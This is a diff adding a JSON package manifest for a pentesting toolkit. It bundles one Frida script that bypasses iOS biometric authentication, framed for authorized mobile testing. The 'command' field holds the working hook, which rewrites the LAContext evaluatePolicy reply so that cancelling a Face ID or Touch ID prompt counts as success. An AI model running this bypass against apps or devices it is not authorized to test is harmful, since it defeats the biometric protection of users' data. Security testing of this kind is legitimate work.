@@ -1,0 +1,185 @@
+{
+  "package_id": "frida-universal-biometrics-v1",
+  "package_name": "Frida - Universal - Biometrics",
+  "version": "1.0.0",
+  "summary": "1 Frida instrumentation procedures for universal biometrics mobile testing.",
+  "description": "Source-faithful public Frida JavaScript from CodeShare and curated repositories, statically validated and classified for authorized mobile dynamic analysis.",
+  "purpose": "Run authorized Android/iOS runtime observation, hooking, framework, network, crypto, storage, and security-control validation through a Morgana host Agent.",
+  "capabilities": [
+    "Contains 1 standalone Frida procedures from 1 source families.",
+    "Target platforms: universal-native; frameworks: generic-native.",
+    "Scope mix: {'generic': 1}; compatibility: {'likely-compatible': 1}."
+  ],
+  "use_cases": [
+    "Instrument an explicitly authorized Android or iOS test application through USB or Frida remote transport.",
+    "Select procedures by platform, framework, behavior, source, app scope, ATT&CK Mobile mapping, or quality tier."
+  ],
+  "prerequisites": [
+    "Morgana host Agent with a compatible Frida CLI installed and reachable in PATH.",
+    "Authorized mobile test device/emulator with Frida server, Gadget, or supported instrumentation path.",
+    "Operator-supplied target package, bundle ID, or process and optional device ID."
+  ],
+  "safety_notes": [
+    "Third-party scripts may change application runtime behavior; review source and risk metadata before execution.",
+    "Unknown-license content is clearly labeled in per-Script metadata and the license inventory.",
+    "Full-corpus runtime validation is intentionally left for isolated operator mobile labs."
+  ],
+  "author": "Frida ecosystem / X3M.AI conversion",
+  "created": "2026-08-29",
+  "script_prefix": "FRIDA - ",
+  "provider": "frida-mobile",
+  "source": "frida-mobile",
+  "source_repository": "https://codeshare.frida.re/",
+  "source_license": "mixed",
+  "documentation_url": "https://frida.re/docs/",
+  "mitre_domain": "mobile-attack",
+  "mitre_tactic": "Mobile Runtime Instrumentation",
+  "mitre_tcodes": [],
+  "platform": [
+    "all"
+  ],
+  "risk_badges": [
+    "interact"
+  ],
+  "category": "mobile/frida/universal",
+  "target_platform_counts": {
+    "universal-native": 1
+  },
+  "frameworks": [
+    "generic-native"
+  ],
+  "behavior_categories": [
+    "biometrics",
+    "enumeration",
+    "method-hooking",
+    "native-hooking",
+    "runtime-tracing"
+  ],
+  "source_providers": [
+    "interference-frida-scripts"
+  ],
+  "scope_counts": {
+    "generic": 1
+  },
+  "quality_distribution": {
+    "A": 1
+  },
+  "license_distribution": {
+    "unknown": 1
+  },
+  "compatibility_distribution": {
+    "likely-compatible": 1
+  },
+  "tag_categories": [
+    {
+      "category_id": "frida_mobile_target",
+      "label": "Frida Mobile Target",
+      "description": "Host-to-mobile Frida target parameters.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "mobile_app_id",
+          "label": "Mobile App ID / Process",
+          "description": "Android package ID, iOS bundle ID, or target process for the authorized test application.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "value"
+        },
+        {
+          "key": "mobile_device_id",
+          "label": "Mobile Device ID",
+          "description": "Optional Frida device identifier. Blank uses the default USB device.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": false,
+          "parameter_class": "value"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "frida:github:interference-security/frida-scripts:security-testing/ios-biometric-bypass.js",
+      "name": "FRIDA - UNIVERSAL - Biometrics - ios biometric bypass [90167d2f]",
+      "description": "Curated Frida source from interference-security/frida-scripts: security-testing/ios-biometric-bypass.js",
+      "tactic": "Mobile Runtime Instrumentation",
+      "tcode": "T0000",
+      "executor": "frida",
+      "executor_config": {
+        "target_platform": "universal-native",
+        "target": "#{mobile_app_id}",
+        "device": "#{mobile_device_id}",
+        "transport": "usb",
+        "mode": "spawn",
+        "resume": true,
+        "max_stdout_bytes": 102400,
+        "max_stderr_bytes": 102400
+      },
+      "platform": "all",
+      "command": "var func_name = \"LAContext [- evaluatePolicy:localizedReason:reply:] method\";\nconsole.warn(\"\\n[*] Hooking: \" + func_name);\nconsole.warn(\"[*] Press CANCEL on biometric authentication prompt to bypass authentication\");\nvar hook = ObjC.classes.LAContext[\"- evaluatePolicy:localizedReason:reply:\"];\nInterceptor.attach(hook.implementation, {\n\tonEnter: function(args) {\n\t\tconsole.warn(\"[*] Detected call to method: \" + func_name);\n\t\tvar block = new ObjC.Block(args[4]);\n\t\tconst callback = block.implementation;\n\t\tblock.implementation = function (error, value)  {\n\t\t\tconsole.warn(\"[*] Changing return value to TRUE to bypass iOS biometric authentication\");\n\t\t\tconst result = callback(1, null);\n\t\t\treturn result;\n\t\t};\n\t},\n});\n",
+      "cleanup_command": null,
+      "required_tags": [
+        "mobile_app_id",
+        "mobile_device_id"
+      ],
+      "required_assets": [],
+      "operational_risk": "interact",
+      "source_metadata": {
+        "repository": "https://github.com/interference-security/frida-scripts",
+        "source_commit": "5fb5f078535296a2f1c9b99bee663f1ea9d7011b",
+        "source_commit_date": "2022-09-26",
+        "source_path": "security-testing/ios-biometric-bypass.js",
+        "platform_hint": [
+          "android",
+          "ios"
+        ],
+        "framework_hint": [],
+        "source_extension": ".js",
+        "target_app": "",
+        "tested_version": "",
+        "provider": "frida-mobile",
+        "source_provider": "interference-frida-scripts",
+        "source_id": "frida:github:interference-security/frida-scripts:security-testing/ios-biometric-bypass.js",
+        "source_url": "https://github.com/interference-security/frida-scripts/blob/5fb5f078535296a2f1c9b99bee663f1ea9d7011b/security-testing/ios-biometric-bypass.js",
+        "source_hash": "90167d2f2f5bef9f041f773ea44ab804fb2a7eee96f706bd7075ad1380ba48ca",
+        "normalized_hash": "0e0fa5652d77f11dcd9ef9626b3214209708dfbdc4339d62d5d5be42e00977a4",
+        "target_platform": "universal-native",
+        "execution_platform": "host-agent",
+        "frameworks": [
+          "generic-native"
+        ],
+        "scope": "generic",
+        "behaviors": [
+          "biometrics",
+          "enumeration",
+          "method-hooking",
+          "native-hooking",
+          "runtime-tracing"
+        ],
+        "primary_behavior": "biometrics",
+        "frida_apis": [
+          "ObjC.classes",
+          "Interceptor.attach"
+        ],
+        "compatibility_status": "likely-compatible",
+        "mitre_domain": "mobile-attack",
+        "source_tcodes": [],
+        "mitre_mapping_status": "unmapped",
+        "quality_tier": "A",
+        "license": "unknown",
+        "license_source": "No repository LICENSE file",
+        "distribution_status": "unknown-license",
+        "readiness": "ready_with_target",
+        "duplicate_of": null,
+        "derived_from": null,
+        "source_modified": false,
+        "transformations": []
+      }
+    }
+  ],
+  "chains": []
+}
